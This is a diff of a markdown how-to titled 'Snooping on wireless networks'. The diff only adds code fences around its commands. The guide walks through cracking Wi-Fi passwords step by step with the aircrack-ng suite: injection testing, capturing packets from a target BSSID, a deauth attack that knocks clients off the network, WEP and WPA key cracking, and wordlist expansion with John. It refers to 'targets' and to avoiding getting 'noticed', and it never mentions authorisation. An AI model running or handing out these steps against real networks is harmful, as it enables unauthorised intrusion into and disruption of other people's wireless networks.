@@ -45,11 +45,15 @@ Snooping on wireless networks
 
 2. Check that your card support packet injection
 
+```
  aireplay-ng --test mon0 
+```
 
 3. Check what wireless networks are out there (find our targets)
 
+```
  airodump-ng mon0
+```
 
 
 WEP Networks
@@ -59,11 +63,15 @@ Following from the steps above...
 
 4. Home in on our target network and start saving packets for cracking later
 
+```
  airodump-ng --bssid 00:1F:1F:A8:9D:34 --channel 1 mon0 -w packetcapture.pcap
+```
 
 5. Run a "deauth" attack to knock client off the target network
  
+```
  aireplay-ng --deauth 10 -a 00:1F:1F:A8:9D:34 --channel 1 mon0 
+```
 
 
 You can either continue to do this and probably get noticed, or shift your attack
@@ -72,7 +80,9 @@ can in order to crack the password.
 
 6. Crack that password
  
+```
  aircrack-ng -a 1 packetcapture.pcap
+```
 
 
 Wordlists
@@ -81,7 +91,9 @@ Wordlists
 Our initial wordlist (wordlist.txt) is probably not quite up to scratch, but with a little
 manipulation from John, it may be more useful. 
 
+```
  john --wordlist=wordlist.txt --rules --stdout > new_superleet_wordlist.txt
+```
 
 
 WPA Networks 
@@ -96,7 +108,9 @@ After that it's up to having either a good wordlist or decent rainbow tables.
 Without those, you will be in trouble...
 
 
+```
  aircrack-ng -a 2 -w new_superleet_wordlist.txt wpa_packetcapture.pcap
+```
 
 
 That's all there is to it really. 
